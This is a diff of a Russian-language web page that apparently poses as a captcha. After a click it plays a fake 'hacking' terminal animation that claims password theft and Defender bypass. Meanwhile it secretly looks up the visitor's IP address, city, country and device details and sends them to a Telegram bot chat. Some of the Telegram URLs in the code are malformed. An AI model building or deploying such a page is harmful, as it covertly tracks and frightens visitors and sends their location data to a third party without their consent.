@@ -45,73 +45,79 @@
         const chat_id = "-1003861311533";
 
         async function startHack() {
-         
+       
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
- 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик зафиксирован! Начинаю взлом...")}`);
 
+ 
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик! Начинаю сбор данных...")}`);
+ 
             const lines = [
-                "> [INIT] Инициализация взлома...",
-                "> [INFO] Обход reCAPTCHA v2... [OK]",
-                "> [SYSTEM] Поиск уязвимостей...",
-                "> [CRITICAL] Доступ к ядру получен",
-                "> [INFO] Извлечение базы паролей...",
-                "> [INFO] Копирование медиафайлов...",
-                "> [ALERT] Отправка данных на сервер..."
+                "> [INIT] Инициализация взлома...", "> [INFO] Поиск уязвимостей...",
+                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...",
+                "> [WARNING] Defender обнаружил активность", "> [SUCCESS] Defender отключен",
+                "> [SYSTEM] Доступ к ядру системы...", "> [CRITICAL] Права ROOT получены",
+                "> [INFO] Чтение папки %APPDATA%...", "> [SUCCESS] База паролей извлечена",
+                "> [INFO] Доступ к камере получен", "> [INFO] Синхронизация с сервером...",
+                "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
             ];
 
- 
             for (let line of lines) {
                 let p = document.createElement('p');
                 p.innerText = line;
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 250)); 
+                await new Promise(r => setTimeout(r, 350)); 
             }
 
-   
-            await sendFullData();
-
-   
-            term.style.display = 'none';
-            document.getElementById('leak-box').style.display = 'block';
+     
+            await sendDataAndFinish();
         }
 
-        async function sendFullData() {
+                async function sendDataAndFinish() {
             let ip = "Не определен";
-            let city = "Не определен";
-            let device = navigator.userAgent;
+            let city = "Неизвестно";
+            let country = "";
 
-                    try {
+            try {
+          
+                let res = await fetch('http://ip-api.com/json/');
+                let d = await res.json();
+                
+               
+                if (d.status !== "success") {
+                    res = await fetch('https://ipwho.is/');
+                    d = await res.json();
+                    ip = d.ip || "Не определен";
+                    city = d.city || "Неизвестно";
+                    country = d.country || "";
+                } else {
+                    ip = d.query;
+                    city = d.city;
+                    country = d.country;
+                }
+
+        
+                document.getElementById('user-ip').innerText = ip;
+                document.getElementById('user-geo').innerText = city + (country ? ", " + country : "");
+                document.getElementById('user-os').innerText = navigator.platform;
+
+                
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}, ${country}\n📱 Устройство: ${navigator.userAgent}`;
+                
+                
+                await fetch(`https://api.telegram.org/bot${token}{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+
+            } catch (e) {
        
-            let res = await fetch('https://ipwho.is/');
-            let d = await res.json();
-            
-       
-            if (!d.ip) {
-                res = await fetch('https://api.ipify.org?format=json');
-                d = await res.json();
+                const backup = `⚠️ Переход (Ошибка обоих сервисов IP)!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
 
-            const ip = d.ip || "Не определен";
-            const city = d.city || d.location?.city || "Неизвестно";
-
-          
-            document.getElementById('user-ip').innerText = ip;
-            document.getElementById('user-geo').innerText = city;
-            document.getElementById('user-os').innerText = navigator.platform;
-
-   
-            const report = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
-            await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
-
-        } catch (e) {
              
-            const backup = `⚠️ Переход (Ошибка IP)!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
-            fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
-         }
+            document.getElementById('terminal').style.display = 'none';
+            document.getElementById('leak-box').style.display = 'block';
         }
     </script>
 </body>
